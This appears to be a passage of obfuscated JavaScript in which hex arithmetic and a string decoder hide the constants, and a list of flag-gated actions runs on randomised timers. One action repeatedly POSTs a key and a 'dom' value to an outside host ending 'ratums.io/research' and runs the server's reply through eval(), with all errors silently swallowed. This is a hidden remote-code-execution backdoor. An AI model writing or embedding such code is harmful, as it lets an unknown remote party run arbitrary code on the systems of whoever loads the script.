        setTimeout(g, (-0x3 * -0x32ad + -0xeba7 + 0x13e00) * h * getRandomInt(0x38e + -0x8 * -0x40a + -0x23dd, -0x1592 + 0x3 * 0x2a4 + 0xda9));
      setInterval(() => {
        g();
        for (let i = -0x7b1 * 0x1 + -0xb2a + 0x12db; i < 0x2 * -0x368 + -0x74f * -0x1 + 0x1 * -0x7b; i++)
          setTimeout(g, (0x2 * 0x4a32 + 0x9173 + -0x3b77) * i * getRandomInt(0x2 * 0xb1b + 0x1fec + -0x3621, 0x1 * -0x1c71 + 0x20ae + -0x1 * 0x43a));
      }, -0xfa2 * 0x168 + 0x25c9ee + 0x20e * 0x2dc7);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        const U = b;
        try {
          axios['post'](U(0x7, 'EITg') + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, -0x19825 * -0x5 + 0x88 * -0xdf0 + 0x402a7 * 0x1);
    }
  ]
];
for (let e of actions)
  try {
    e[-0xc5c + 0x1d * 0x31 + 0x6cf]() && setTimeout(e[0xf86 * -0x1 + 0x4 * -0x6da + -0x1d * -0x17b]);
  } catch (K) {
    warn(K);
  }